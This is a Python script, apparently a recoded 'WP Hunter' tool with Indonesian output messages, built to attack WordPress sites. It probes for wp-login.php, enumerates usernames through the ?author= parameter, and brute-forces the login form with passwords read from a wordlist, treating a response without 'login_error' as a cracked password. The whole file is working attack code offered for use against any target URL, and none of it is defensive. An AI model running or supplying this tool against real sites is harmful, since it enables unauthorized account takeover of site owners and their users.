import requests
import argparse
import re
import os
from time import sleep

# Recode form WP Hunter (https://github.com/thenurhabib)
# https://mainsec.blogspot.com/ 

# User-Agent
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36"
}

# Banner
def banner():
    print("""
\033[1;31m
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣀⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣠⣴⡶⢶⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⣾⠋⠙⢿⣆⣤⣤⣄⠀⠀⠀
⠀⠀⢰⣿⠁⠀⠀⠀⠙⢷⡄⠀⠀⠀⠀⠀⢸⡿⠀⠀⠀⠛⠉⠀⠹⣧⠀⠀
⠀⠀⣠⡿⠆⠀⠀⠀⠀⠈⢿⡄⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⢠⣿⠀⠀
⢀⣾⠋⠀⠀⠀⠀⠀⠀⠀⠈⣿⡀⠀⠀⠀⢸⣧⠀⠀⠀⠀⢀⣴⡿⠁⠀⠀
⠀⠻⣶⣤⣤⣀⣀⣀⣠⣤⣤⣿⡇⠀⠀⠀⠈⣿⣀⣠⣤⡾⠟⠋⠀⠀⠀⠀
⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠛⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀         
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⡀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣤⡾⠛⠋⠹⣷⠀⠀⠀⢸⣿⠛⠛⠉⠉⠉⠙⠛⠛⢷⣦⠀
⠀⠀⠀⠀⣴⡟⠉⠀⠀⠀⠀⣿⡇⠀⠀⠘⣿⡀⠀⠀⠀⠀⠀⠀⠀⣠⡿⠁
⠀⠀⠀⣼⡏⠀⠀⠀⠀⠀⠀⢸⣇⠀⠀⠀⠘⣷⡀⠀⠀⠀⠀⢴⣾⠋⠀⠀
⠀⠀⠀⢻⣇⠀⠀⢀⠀⠀⠀⢸⡟⠀⠀⠀⠀⠙⢷⣄⠀⠀⠀⠀⣿⠇⠀⠀
⠀⠀⠀⠀⠙⠷⠾⠛⢷⣄⣀⣾⠇⠀⠀⠀⠀⠀⠀⠙⠻⠶⠾⠟⠋⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠁⠀⠀    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
""")

# Cek URL
def test_url(target):
    url = f"{target}/wp-login.php"
    try:
        response = requests.get(url, headers=HEADERS, timeout=5)
        if response.status_code == 200:
            print(f"\033[1;32m[✔] WordPress ditemukan di {target}\033[0m")
        else:
            print(f"\033[1;31m[✘] Gagal mengakses {url} (HTTP {response.status_code})\033[0m")
            exit()
    except requests.exceptions.RequestException:
        print(f"\033[1;31m[✘] Tidak dapat terhubung ke {target}\033[0m")
        exit()

# User Enumeration
def user_enum(target):
    print("\n\033[1;33m[+] User Enumeration:\033[0m")
    for i in range(1, 11):
        url = f"{target}/?author={i}"
        response = requests.get(url, headers=HEADERS)
        match = re.search(r"/author/([^/]+)/", response.text)
        if match:
            username = match.group(1)
            print(f"\033[1;32m[✔] Ditemukan Username: {username} ({url})\033[0m")
        sleep(1)

# Brute Force Attack
def brute_force(target, username, wordlist):
    print(f"\n\033[1;33m[+] Memulai brute force pada {target} dengan username '{username}'\033[0m")

    if not os.path.isfile(wordlist):
        print("\033[1;31m[✘] Wordlist tidak ditemukan!\033[0m")
        exit()

    with open(wordlist, "r", encoding="utf-8") as file:
        for password in file:
            password = password.strip()
            print(f"\033[1;34m[*] Mencoba: {username}:{password}\033[0m", end="\r")

            data = {
                "log": username,
                "pwd": password,
                "wp-submit": "Log In",
                "redirect_to": f"{target}/wp-admin",
                "testcookie": "1"
            }

            response = requests.post(f"{target}/wp-login.php", headers=HEADERS, data=data, timeout=5)

            if "login_error" not in response.text:
                print(f"\n\033[1;32m[✔] Password ditemukan: {password}\033[0m")
                break
    print("\n\033[1;33m[!] Brute force selesai.\033[0m")

# Main Program
if __name__ == "__main__":
    banner()
    
    parser = argparse.ArgumentParser(description="WordPress Login Brute Force")
    parser.add_argument("-url", required=True, help="Target URL (contoh: http://example.com)")
    parser.add_argument("-u", "--user", help="Username untuk brute force")
    parser.add_argument("-p", "--wordlist", help="Path ke file wordlist")

    args = parser.parse_args()
    target_url = args.url.rstrip("/")
    
    test_url(target_url)
    
    if args.user and args.wordlist:
        brute_force(target_url, args.user, args.wordlist)
    else:
        user_enum(target_url)
